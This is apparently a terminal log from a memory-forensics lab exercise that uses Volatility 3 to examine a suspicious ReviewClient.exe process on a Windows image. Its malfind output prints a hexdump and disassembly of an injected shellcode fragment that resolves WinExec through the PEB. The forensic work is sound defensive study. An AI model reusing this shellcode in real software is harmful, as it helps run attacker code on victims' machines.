+***** 4112	2496	explorer.exe	0xbd8fdb86d0c0	61	-	1	False	2026-10-05 03:53:37.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\explorer.exe	C:\Windows\Explorer.EXE	C:\Windows\Explorer.EXE
+****** 6016	4112	OneDrive.exe	0xbd8fdc06a080	22	-	1	True	2026-10-05 03:53:53.000000 UTC	N/A	\Device\HarddiskVolume1\Users\s.reyes\AppData\Local\Microsoft\OneDrive\OneDrive.exe	"C:\Users\s.reyes\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background	C:\Users\s.reyes\AppData\Local\Microsoft\OneDrive\OneDrive.exe
+****** 5812	4112	SecurityHealth	0xbd8fdc0d0340	4	-	1	False	2026-10-05 03:53:52.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\SecurityHealthSystray.exe	"C:\Windows\System32\SecurityHealthSystray.exe" 	C:\Windows\System32\SecurityHealthSystray.exe
+****** 5948	4112	VBoxTray.exe	0xbd8fdc069300	16	-	1	False	2026-10-05 03:53:52.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\VBoxTray.exe	"C:\Windows\System32\VBoxTray.exe" 	C:\Windows\System32\VBoxTray.exe
+**** 772	556	fontdrvhost.ex	0xbd8fda911140	6	-	1	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\fontdrvhost.exe	"fontdrvhost.exe"	C:\Windows\system32\fontdrvhost.exe
+**** 1004	556	dwm.exe	0xbd8fda9c0080	18	-	1	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\dwm.exe	"dwm.exe"	C:\Windows\system32\dwm.exe
+** 1252	628	svchost.exe	0xbd8fdac1f240	5	-	0	False	2026-10-05 06:53:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k wsappx -p -s ClipSVC	C:\Windows\System32\svchost.exe
+** 1892	628	svchost.exe	0xbd8fdade3240	6	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s SENS	C:\Windows\system32\svchost.exe
+** 1128	628	svchost.exe	0xbd8fdab88240	18	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule	C:\Windows\system32\svchost.exe
+*** 3416	1128	MicrosoftEdgeU	0xbd8fdb61c300	5	-	0	True	2026-10-05 03:53:36.000000 UTC	N/A	\Device\HarddiskVolume1\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe	"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c	C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
+*** 3424	1128	taskhostw.exe	0xbd8fdb61e300	11	-	1	False	2026-10-05 03:53:36.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\taskhostw.exe	taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}	C:\Windows\system32\taskhostw.exe
+** 3304	628	svchost.exe	0xbd8fdb5ba300	13	-	1	False	2026-10-05 03:53:35.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService	C:\Windows\system32\svchost.exe
+** 3816	628	svchost.exe	0xbd8fdb84a240	17	-	0	False	2026-10-05 03:53:37.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s wuauserv	C:\Windows\system32\svchost.exe
+** 3684	628	svchost.exe	0xbd8fdb84c240	35	-	0	False	2026-10-05 03:53:37.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc	C:\Windows\system32\svchost.exe
+*** 6120	3684	rundll32.exe	0xbd8fdc0bd080	3	-	1	False	2026-10-05 03:54:09.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\rundll32.exe	rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh	C:\Windows\system32\rundll32.exe
+** 2540	628	svchost.exe	0xbd8fdb0d02c0	19	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p -s DPS	C:\Windows\System32\svchost.exe
+** 2668	628	svchost.exe	0xbd8fdb1bd240	6	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s WpnService	C:\Windows\system32\svchost.exe
+** 6252	628	svchost.exe	0xbd8fdc3e7080	5	-	0	False	2026-10-05 03:54:37.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo	C:\Windows\system32\svchost.exe
+** 1648	628	VBoxService.ex	0xbd8fdad0d080	14	-	0	False	2026-10-05 06:53:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\VBoxService.exe	C:\Windows\System32\VBoxService.exe	C:\Windows\System32\VBoxService.exe
+** 1776	628	svchost.exe	0xbd8fd5eef080	10	-	0	False	2026-10-05 03:53:32.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalService -p -s EventSystem	C:\Windows\system32\svchost.exe
+** 756	628	svchost.exe	0xbd8fda908240	21	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k DcomLaunch -p	C:\Windows\system32\svchost.exe
+*** 384	756	RuntimeBroker.	0xbd8fdc2ba2c0	9	-	1	False	2026-10-05 03:53:54.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\RuntimeBroker.exe	C:\Windows\System32\RuntimeBroker.exe -Embedding	C:\Windows\System32\RuntimeBroker.exe
+*** 5764	756	smartscreen.ex	0xbd8fdc076080	15	-	1	False	2026-10-05 03:53:52.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\smartscreen.exe	C:\Windows\System32\smartscreen.exe -Embedding	C:\Windows\System32\smartscreen.exe
+*** 6664	756	RuntimeBroker.	0xbd8fdc2eb080	8	-	1	False	2026-10-05 03:54:24.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\RuntimeBroker.exe	C:\Windows\System32\RuntimeBroker.exe -Embedding	C:\Windows\System32\RuntimeBroker.exe
+*** 3984	756	SppExtComObj.E	0xbd8fdb7b7280	4	-	0	False	2026-10-05 03:53:36.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\SppExtComObj.Exe	C:\Windows\system32\SppExtComObj.exe -Embedding	C:\Windows\system32\SppExtComObj.exe
+*** 6544	756	RuntimeBroker.	0xbd8fdbb9b080	7	-	1	False	2026-10-05 03:54:21.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\RuntimeBroker.exe	C:\Windows\System32\RuntimeBroker.exe -Embedding	C:\Windows\System32\RuntimeBroker.exe
+*** 5276	756	backgroundTask	0xbd8fdbf9e080	7	-	1	False	2026-10-05 03:53:41.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\backgroundTaskHost.exe	"C:\Windows\system32\backgroundTaskHost.exe" -ServerName:MicrosoftEdge.AppXbnf56tvebb2bnpah2t4s0emv5ws4vxt1.mca	C:\Windows\system32\backgroundTaskHost.exe
+*** 6824	756	backgroundTask	0xbd8fdc3eb080	13	-	1	False	2026-10-05 03:54:26.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\backgroundTaskHost.exe	"C:\Windows\system32\backgroundTaskHost.exe" -ServerName:Microsoft.XboxApp.AppXf74jmpwd42x7vxttda454sh29n0qpb8x.mca	C:\Windows\system32\backgroundTaskHost.exe
+*** 6140	756	ShellExperienc	0xbd8fdc27c080	20	-	1	False	2026-10-05 03:53:53.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe	"C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca	C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
+*** 1712	756	backgroundTask	0xbd8fdc16b080	7	-	1	False	2026-10-05 03:54:09.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\backgroundTaskHost.exe	"C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXxw3e32mpkfkfbh0tznpwwqfw96t0tfx6.mca	C:\Windows\system32\backgroundTaskHost.exe
+*** 6192	756	RuntimeBroker.	0xbd8fdb3f1080	8	-	1	False	2026-10-05 03:54:36.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\RuntimeBroker.exe	C:\Windows\System32\RuntimeBroker.exe -Embedding	C:\Windows\System32\RuntimeBroker.exe
+*** 5704	756	RuntimeBroker.	0xbd8fdc1672c0	8	-	1	False	2026-10-05 03:53:49.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\RuntimeBroker.exe	C:\Windows\System32\RuntimeBroker.exe -Embedding	C:\Windows\System32\RuntimeBroker.exe
+*** 6604	756	SkypeApp.exe	0xbd8fdc2ec080	13	-	1	False	2026-10-05 03:54:22.000000 UTC	N/A	\Device\HarddiskVolume1\Program Files\WindowsApps\Microsoft.SkypeApp_14.53.77.0_x64__kzf8qxf38zg5c\SkypeApp.exe	"C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.53.77.0_x64__kzf8qxf38zg5c\SkypeApp.exe" -ServerName:App.AppXffn3yxqvgawq9fpmnhy90fr3y01d1t5b.mca	C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.53.77.0_x64__kzf8qxf38zg5c\SkypeApp.exe
+*** 3664	756	ApplicationFra	0xbd8fd4b75300	12	-	1	False	2026-10-05 03:54:37.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\ApplicationFrameHost.exe	C:\Windows\system32\ApplicationFrameHost.exe -Embedding	C:\Windows\system32\ApplicationFrameHost.exe
+*** 4820	756	StartMenuExper	0xbd8fdb872080	21	-	1	False	2026-10-05 03:53:39.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe	"C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca	C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe
+*** 6740	756	backgroundTask	0xbd8fdc55f080	6	-	1	False	2026-10-05 03:54:25.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\backgroundTaskHost.exe	"C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXsqpbawq1jx69hhfyy1dr9y35whgstkrr.mca	C:\Windows\system32\backgroundTaskHost.exe
+*** 6612	756	backgroundTask	0xbd8fdc52a080	14	-	1	False	2026-10-05 03:54:38.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\backgroundTaskHost.exe	"C:\Windows\system32\backgroundTaskHost.exe" -ServerName:Microsoft.MicrosoftOfficeHub.AppXw8g9avr3kjktpasvy3yntgdfexhxs23z.mca	C:\Windows\system32\backgroundTaskHost.exe
+*** 6872	756	RuntimeBroker.	0xbd8fdba482c0	8	-	1	False	2026-10-05 03:54:29.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\RuntimeBroker.exe	C:\Windows\System32\RuntimeBroker.exe -Embedding	C:\Windows\System32\RuntimeBroker.exe
+*** 7000	756	backgroundTask	0xbd8fdc3f0080	9	-	1	False	2026-10-05 03:54:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\backgroundTaskHost.exe	"C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXggkaqzf6p31g37n0m8phzeswb0rt9m7e.mca	C:\Windows\system32\backgroundTaskHost.exe
+*** 5084	756	SearchApp.exe	0xbd8fdbd44080	33	-	1	False	2026-10-05 03:53:40.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe	"C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca	C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
+*** 4320	756	WmiPrvSE.exe	0xbd8fdb9ba280	8	-	0	False	2026-10-05 03:53:37.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\wbem\WmiPrvSE.exe	C:\Windows\system32\wbem\wmiprvse.exe	C:\Windows\system32\wbem\wmiprvse.exe
+*** 6504	756	backgroundTask	0xbd8fdc57d340	8	-	1	False	2026-10-05 03:54:21.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\backgroundTaskHost.exe	"C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppX4325622ft6437f3xfywcfxgbedfvpn0x.mca	C:\Windows\system32\backgroundTaskHost.exe
+*** 4840	756	WWAHost.exe	0xbd8fd48f2080	29	-	1	False	2026-10-05 03:54:37.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\WWAHost.exe	"C:\Windows\system32\wwahost.exe" -ServerName:Microsoft.MicrosoftOfficeHub.wwa	C:\Windows\system32\wwahost.exe
+*** 2664	756	backgroundTask	0xbd8fd5ce8080	7	-	1	False	2026-10-05 03:54:41.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\backgroundTaskHost.exe	"C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppX42r8evwg359fn5xfrxhj5nv2n3dnya3e.mca	C:\Windows\system32\backgroundTaskHost.exe
+*** 4976	756	RuntimeBroker.	0xbd8fdbd1a2c0	9	-	1	False	2026-10-05 03:53:40.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\RuntimeBroker.exe	C:\Windows\System32\RuntimeBroker.exe -Embedding	C:\Windows\System32\RuntimeBroker.exe
+*** 4592	756	RuntimeBroker.	0xbd8fdbec22c0	16	-	1	False	2026-10-05 03:53:41.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\RuntimeBroker.exe	C:\Windows\System32\RuntimeBroker.exe -Embedding	C:\Windows\System32\RuntimeBroker.exe
+*** 4848	756	backgroundTask	0xbd8fda9bd080	8	-	1	False	2026-10-05 03:54:36.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\backgroundTaskHost.exe	"C:\Windows\system32\backgroundTaskHost.exe" -ServerName:Microsoft.MicrosoftOfficeHub.AppX54h2e8jwdm50fj5ha8987vz1etpx7czd.mca	C:\Windows\system32\backgroundTaskHost.exe
+*** 6772	756	RuntimeBroker.	0xbd8fdc4cc2c0	7	-	1	False	2026-10-05 03:54:26.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\RuntimeBroker.exe	C:\Windows\System32\RuntimeBroker.exe -Embedding	C:\Windows\System32\RuntimeBroker.exe
+*** 2812	756	RuntimeBroker.	0xbd8fdb9292c0	6	-	1	False	2026-10-05 03:54:10.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\RuntimeBroker.exe	C:\Windows\System32\RuntimeBroker.exe -Embedding	C:\Windows\System32\RuntimeBroker.exe
+** 2676	628	MsMpEng.exe	0xbd8fdb1bf240	29	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Program Files\Windows Defender\MsMpEng.exe	"C:\Program Files\Windows Defender\MsMpEng.exe"	C:\Program Files\Windows Defender\MsMpEng.exe
+** 4084	628	svchost.exe	0xbd8fdb81e2c0	9	-	0	False	2026-10-05 03:53:36.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalService -p -s LicenseManager	C:\Windows\System32\svchost.exe
+** 1528	628	svchost.exe	0xbd8fdad0c080	4	-	0	False	2026-10-05 06:53:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -s WPDBusEnum	C:\Windows\system32\svchost.exe
+** 1660	628	svchost.exe	0xbd8fdad0e080	8	-	0	False	2026-10-05 06:53:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k NetworkService -p -s NlaSvc	C:\Windows\System32\svchost.exe
+* 764	492	fontdrvhost.ex	0xbd8fda90f140	6	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\fontdrvhost.exe	"fontdrvhost.exe"	C:\Windows\system32\fontdrvhost.exe
+6260	6164	ReviewClient.e	0xbd8fdbebd080	4	-	1	True	2026-10-05 03:54:18.000000 UTC	N/A	\Device\HarddiskVolume1\Users\s.reyes\Downloads\DocumentReview\ReviewClient.exe	"C:\Users\s.reyes\Downloads\DocumentReview\ReviewClient.exe" 	C:\Users\s.reyes\Downloads\DocumentReview\ReviewClient.exe
+6280	6164	notepad.exe	0xbd8fdc55e0c0	6	-	1	False	2026-10-05 03:54:18.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\notepad.exe	"C:\Windows\system32\notepad.exe" 	C:\Windows\system32\notepad.exe
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mpstree[27mpstree
+[?2004lsystemd─┬─ModemManager───3*[{ModemManager}]
+        ├─NetworkManager───3*[{NetworkManager}]
+        ├─accounts-daemon───3*[{accounts-daemon}]
+        ├─acpid
+        ├─agent───3*[{agent}]
+        ├─2*[agetty]
+        ├─amazon-ssm-agen─┬─ssm-agent-worke───10*[{ssm-agent-worke}]
+        │                 └─7*[{amazon-ssm-agen}]
+        ├─avahi-daemon───avahi-daemon
+        ├─4*[ayatana-indicat───4*[{ayatana-indicat}]]
+        ├─ayatana-indicat───3*[{ayatana-indicat}]
+        ├─cron
+        ├─cups-browsed───3*[{cups-browsed}]
+        ├─cupsd
+        ├─dbus-daemon
+        ├─gnome-remote-de───3*[{gnome-remote-de}]
+        ├─group-admin-dae───3*[{group-admin-dae}]
+        ├─2*[kerneloops]
+        ├─lightdm─┬─Xorg───{Xorg}
+        │         ├─lightdm─┬─lightdm-greeter───arctica-greeter───6*[{arctica-greeter}]
+        │         │         └─3*[{lightdm}]
+        │         ├─lightdm
+        │         └─3*[{lightdm}]
+        ├─mate-settings-d───4*[{mate-settings-d}]
+        ├─multipathd───6*[{multipathd}]
+        ├─nm-applet───4*[{nm-applet}]
+        ├─onboard───5*[{onboard}]
+        ├─plank───4*[{plank}]
+        ├─polkitd───3*[{polkitd}]
+        ├─power-profiles-───3*[{power-profiles-}]
+        ├─python3
+        ├─rsyslogd───3*[{rsyslogd}]
+        ├─rtkit-daemon───2*[{rtkit-daemon}]
+        ├─snapd───9*[{snapd}]
+        ├─sshd───sshd───sshd───bash───pstree
+        ├─switcheroo-cont───3*[{switcheroo-cont}]
+        ├─systemd─┬─(sd-pam)
+        │         ├─at-spi-bus-laun─┬─dbus-daemon
+        │         │                 └─4*[{at-spi-bus-laun}]
+        │         ├─at-spi2-registr───3*[{at-spi2-registr}]
+        │         ├─dbus-daemon
+        │         ├─dconf-service───3*[{dconf-service}]
+        │         ├─gnome-keyring-d───4*[{gnome-keyring-d}]
+        │         ├─gvfsd───3*[{gvfsd}]
+        │         ├─gvfsd-fuse───6*[{gvfsd-fuse}]
+        │         ├─2*[pipewire───2*[{pipewire}]]
+        │         ├─pipewire-pulse───2*[{pipewire-pulse}]
+        │         └─wireplumber───5*[{wireplumber}]
+        ├─systemd─┬─(sd-pam)
+        │         ├─at-spi-bus-laun─┬─dbus-daemon
+        │         │                 └─4*[{at-spi-bus-laun}]
+        │         ├─at-spi2-registr───3*[{at-spi2-registr}]
+        │         ├─bamfdaemon───4*[{bamfdaemon}]
+        │         ├─clock-applet───5*[{clock-applet}]
+        │         ├─dbus-daemon
+        │         ├─dconf-service───3*[{dconf-service}]
+        │         ├─evolution-addre───6*[{evolution-addre}]
+        │         ├─evolution-calen───9*[{evolution-calen}]
+        │         ├─evolution-sourc───4*[{evolution-sourc}]
+        │         ├─gnome-keyring-d───4*[{gnome-keyring-d}]
+        │         ├─goa-daemon───4*[{goa-daemon}]
+        │         ├─goa-identity-se───3*[{goa-identity-se}]
+        │         ├─gvfs-afc-volume───4*[{gvfs-afc-volume}]
+        │         ├─gvfs-goa-volume───3*[{gvfs-goa-volume}]
+        │         ├─gvfs-gphoto2-vo───3*[{gvfs-gphoto2-vo}]
+        │         ├─gvfs-mtp-volume───3*[{gvfs-mtp-volume}]
+        │         ├─gvfs-udisks2-vo───4*[{gvfs-udisks2-vo}]
+        │         ├─gvfsd─┬─gvfsd-trash───4*[{gvfsd-trash}]
+        │         │       └─3*[{gvfsd}]
+        │         ├─gvfsd-fuse───6*[{gvfsd-fuse}]
+        │         ├─gvfsd-metadata───3*[{gvfsd-metadata}]
+        │         ├─obexd
+        │         ├─2*[pipewire───2*[{pipewire}]]
+        │         ├─pipewire-pulse───2*[{pipewire-pulse}]
+        │         ├─wireplumber───5*[{wireplumber}]
+        │         ├─xdg-desktop-por───5*[{xdg-desktop-por}]
+        │         ├─xdg-desktop-por───4*[{xdg-desktop-por}]
+        │         ├─xdg-document-po─┬─fusermount3
+        │         │                 └─6*[{xdg-document-po}]
+        │         └─xdg-permission-───3*[{xdg-permission-}]
+        ├─systemd-journal
+        ├─systemd-logind
+        ├─systemd-network
+        ├─systemd-resolve
+        ├─systemd-timesyn───{systemd-timesyn}
+        ├─systemd-udevd
+        ├─tigervncserver─┬─Xtigervnc
+        │                └─mate-session─┬─agent───3*[{agent}]
+        │                               ├─6*[ayatana-indicat───4*[{ayatana-indicat}]]
+        │                               ├─ayatana-indicat───6*[{ayatana-indicat}]
+        │                               ├─2*[ayatana-indicat───3*[{ayatana-indicat}]]
+        │                               ├─blueman-applet───4*[{blueman-applet}]
+        │                               ├─caja─┬─mate-terminal─┬─bash
+        │                               │      │               └─5*[{mate-terminal}]
+        │                               │      └─5*[{caja}]
+        │                               ├─evolution-alarm───7*[{evolution-alarm}]
+        │                               ├─marco───5*[{marco}]
+        │                               ├─mate-panel───5*[{mate-panel}]
+        │                               ├─mate-screensave───4*[{mate-screensave}]
+        │                               ├─mate-settings-d───6*[{mate-settings-d}]
+        │                               ├─nm-applet───5*[{nm-applet}]
+        │                               ├─polkit-mate-aut───4*[{polkit-mate-aut}]
+        │                               ├─update-notifier───5*[{update-notifier}]
+        │                               └─4*[{mate-session}]
+        ├─udisksd───5*[{udisksd}]
+        ├─unattended-upgr───{unattended-upgr}
+        ├─update-manager───4*[{update-manager}]
+        ├─upowerd───3*[{upowerd}]
+        └─wpa_supplicant
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mmkdir -p /tmp/out[27mmkdir -p /tmp/out
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem windows.malfind --pid 6260 > /tmp/malfind.txt[27m [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cvol -s symbols -f memory.mem windows.malfind --pid 6260 > /tmp/malfind.txt [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kt
+[?2004lProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    7.91		Scanning Elf64Layer using PageMapScannerProgress:   15.11		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:   64.75		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:  100.00		Stacking attempts finished              Progress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:  100.00		PDB scanning finished                        /home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/deprecation.py:28: FutureWarning: This API (volatility3.plugins.windows.malware.malfind.Malfind.run) will be removed in the first release after 2026-06-07. This plugin has been renamed, please call volatility3.plugins.windows.malware.malfind.Malfind rather than volatility3.plugins.windows.malfind.Malfind.
+  warnings.warn(
+/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/deprecation.py:105: FutureWarning: This plugin (volatility3.plugins.windows.malfind.Malfind) has been renamed and will be removed in the first release after 2026-06-07. Please ensure all method calls to this plugin are replaced with calls to volatility3.plugins.windows.malware.malfind.Malfind
+  warnings.warn(
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mhead -60 /tmp/malfind.txt[27mhead -60 /tmp/malfind.txt
+[?2004lVolatility 3 Framework 2.28.2
+
+PID	Process	Start VPN	End VPN	Tag	Protection	CommitCharge	PrivateMemory	File output	Notes	Hexdump	Disasm
+
+6260	ReviewClient.e	0x8e0000	0x8e0fff	VadS	PAGE_EXECUTE_READWRITE	1	1	Disabled	Function prologue	
+55 89 e5 83 ec 18 31 f6 56 6a 63 66 68 78 65 68 U.....1.Vjcfhxeh
+57 69 6e 45 89 65 fc 64 8b 5e 30 8b 5b 0c 8b 5b WinE.e.d.^0.[..[
+14 8b 1b 8b 1b 8b 5b 10 89 5d f8 8b 43 3c 01 d8 ......[..]..C<..
+8b 40 78 01 d8 8b 48 24 01 d9 89 4d f4 31 c9 41 .@x...H$...M.1.A	
+0x8e0000:	push	ebp
+0x8e0001:	mov	ebp, esp
+0x8e0003:	sub	esp, 0x18
+0x8e0006:	xor	esi, esi
+0x8e0008:	push	esi
+0x8e0009:	push	0x63
+0x8e000b:	push	0x6578
+0x8e000f:	push	0x456e6957
+0x8e0014:	mov	dword ptr [ebp - 4], esp
+0x8e0017:	mov	ebx, dword ptr fs:[esi + 0x30]
+0x8e001b:	mov	ebx, dword ptr [ebx + 0xc]
+0x8e001e:	mov	ebx, dword ptr [ebx + 0x14]
+0x8e0021:	mov	ebx, dword ptr [ebx]
+0x8e0023:	mov	ebx, dword ptr [ebx]
+0x8e0025:	mov	ebx, dword ptr [ebx + 0x10]
+0x8e0028:	mov	dword ptr [ebp - 8], ebx
+0x8e002b:	mov	eax, dword ptr [ebx + 0x3c]
+0x8e002e:	add	eax, ebx
+0x8e0030:	mov	eax, dword ptr [eax + 0x78]
+0x8e0033:	add	eax, ebx
+0x8e0035:	mov	ecx, dword ptr [eax + 0x24]
+0x8e0038:	add	ecx, ebx
+0x8e003a:	mov	dword ptr [ebp - 0xc], ecx
+0x8e003d:	xor	ecx, ecx
+0x8e003f:	inc	ecx
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem -o /tmp/out windows.malfind --pid 6260 --dump[27m [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cvol -s symbols -f memory.mem -o /tmp/out windows.malfind --pid 6260 --dump [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kp
+[?2004lVolatility 3 Framework 2.28.2
